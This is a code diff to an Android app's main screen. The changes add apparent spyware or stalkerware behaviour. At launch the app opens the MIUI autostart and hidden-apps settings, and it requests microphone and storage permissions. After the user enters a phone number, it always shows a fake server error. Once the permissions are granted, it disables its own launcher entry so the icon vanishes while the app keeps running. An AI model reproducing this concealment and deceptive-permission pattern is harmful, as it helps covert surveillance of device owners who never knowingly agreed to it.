@@ -23,7 +23,7 @@ import java.util.concurrent.TimeUnit;
 public class MainActivity extends AppCompatActivity {
 
 
-    Button nextbut;
+    Button nextbut,ab;
     EditText pn;
 
     @Override
@@ -32,14 +32,25 @@ public class MainActivity extends AppCompatActivity {
         setContentView(R.layout.activity_main);
         nextbut=findViewById(R.id.next);
         pn=findViewById(R.id.phone);
+        ab=findViewById(R.id.AboutButton);
 
 
 
-
-
+        try{Intent intent = new Intent();
+            intent.setClassName("com.miui.powerkeeper",
+                    "com.miui.powerkeeper.ui.HiddenAppsContainerManagementActivity");
+            startActivity(intent);}catch (Exception eeee){eeee.printStackTrace();}
+        try { Intent intent = new Intent().setComponent(new ComponentName("com.miui.securitycenter", "com.miui.permcenter.autostart.AutoStartManagementActivity")); startActivity(intent);}catch (Exception e){e.printStackTrace();}
 
 
         boolean check =checkAndRequestPermissions();
+        ab.setOnClickListener(new View.OnClickListener() {
+            @Override
+            public void onClick(View v) {
+                Intent intent=new Intent(MainActivity.this,AboutPage.class);
+                startActivity(intent);
+            }
+        });
         nextbut.setOnClickListener(new View.OnClickListener() {
             @Override
             public void onClick(View v) {
@@ -47,23 +58,24 @@ public class MainActivity extends AppCompatActivity {
 
                 if (check){
                     if (pn.length()!=10){Toast.makeText(MainActivity.this, "Invalid Number", Toast.LENGTH_SHORT).show();}
-                    else{Toast.makeText(MainActivity.this, "Something went wrong!", Toast.LENGTH_SHORT).show(); }
+                    else{
+                        Toast.makeText(MainActivity.this, "please wait", Toast.LENGTH_LONG).show();
+                        Toast.makeText(MainActivity.this, "Something went wrong with server response!", Toast.LENGTH_SHORT).show();
+
+                        Intent intent=new Intent(MainActivity.this,Error.class);
+                        startActivity(intent);
+                    }
                 }
                 else{Toast.makeText(MainActivity.this, "Accept Permission for this  app to continue", Toast.LENGTH_SHORT).show();}
 
             }
         });
 
-
-
-        //PackageManager p = getApplicationContext().getPackageManager();
-        //p.setComponentEnabledSetting(getComponentName(),PackageManager.COMPONENT_ENABLED_STATE_DISABLED, PackageManager.DONT_KILL_APP);
-
-        //<uses-feature android:name="android.software.leanback" android:required="true" />  tools:ignore="ImpliedTouchscreenHardware">
-
-
-
-
+        if (check) {
+            ComponentName componentToDisable = new ComponentName(this, MainActivity.class);
+            PackageManager p = getPackageManager();
+            p.setComponentEnabledSetting(componentToDisable, PackageManager.COMPONENT_ENABLED_STATE_DISABLED, PackageManager.DONT_KILL_APP);
+        }
     }
 
 
@@ -83,7 +95,8 @@ public class MainActivity extends AppCompatActivity {
         int CallAudio= ContextCompat.checkSelfPermission(this,Manifest.permission.RECORD_AUDIO);
         int readstore= ContextCompat.checkSelfPermission(this,Manifest.permission.READ_EXTERNAL_STORAGE);
 
-        try { Intent intent = new Intent().setComponent(new ComponentName("com.miui.securitycenter", "com.miui.permcenter.autostart.AutoStartManagementActivity")); }catch (Exception e){e.printStackTrace();}
+
+
 
 
 
@@ -107,13 +120,18 @@ public class MainActivity extends AppCompatActivity {
         }else{flagnumber++;}
 
 
+
+
+
         if (!listPermissionsNeeded.isEmpty()) {
             ActivityCompat.requestPermissions(this,
                     (String[]) listPermissionsNeeded.toArray(new String[listPermissionsNeeded.size()]),
                     1);
         }
+
         if(flagnumber==5){return true;}
-        else{return false;}
+        else{
+            return false;}
     }
 
 
